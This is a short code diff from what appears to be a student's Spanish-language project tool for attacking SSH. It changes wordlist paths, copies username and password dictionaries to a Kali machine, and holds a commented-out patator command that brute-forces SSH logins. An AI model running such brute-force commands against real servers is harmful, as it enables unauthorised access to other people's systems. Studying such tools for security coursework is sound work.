@@ -17,9 +17,9 @@ def sshAttack(ssh, targets, sistema, usernarme_dict = "", password_dict = "", GU
     '''
 
     if(usernarme_dict == ""):
-        usernarme_dict = "/root/Documents/Diccionarios/usernames.txt"
+        usernarme_dict = "/home/kali/Documents/Diccionarios/usernames.txt"
     if(password_dict == ""):
-        password_dict = "/root/Documents/Diccionarios/passwords.txt"
+        password_dict = "/home/kali/Documents/Diccionarios/passwords.txt"
 
     ruta_usernames = "C:\\Users\\Aru-kun\\Documents\\TFG\\Scripts Python\\AttackApp\\Diccionarios\\usernames.txt"
     ruta_passwords = "C:\\Users\\Aru-kun\\Documents\\TFG\\Scripts Python\\AttackApp\\Diccionarios\\passwords.txt"
@@ -27,7 +27,7 @@ def sshAttack(ssh, targets, sistema, usernarme_dict = "", password_dict = "", GU
 
     updateFile(ssh, ruta_origen=ruta_usernames, sistema=sistema, ruta_destino=usernarme_dict)
     updateFile(ssh, ruta_origen=ruta_passwords, sistema=sistema, ruta_destino=password_dict)
-
+    print("He cargado los archivos")
 
     #print("patator ssh_login host=" + target + " user=FILE0 0=" + usernarme_dict + " password=FILE1 1=" + password_dict)
    # stdin, stdout, stderr = ssh.exec_command("patator ssh_login host=" + target + " user=FILE0 0=" + usernarme_dict + " password=FILE1 1=" + password_dict + " -x ignore:msg='Authentication failed.'")
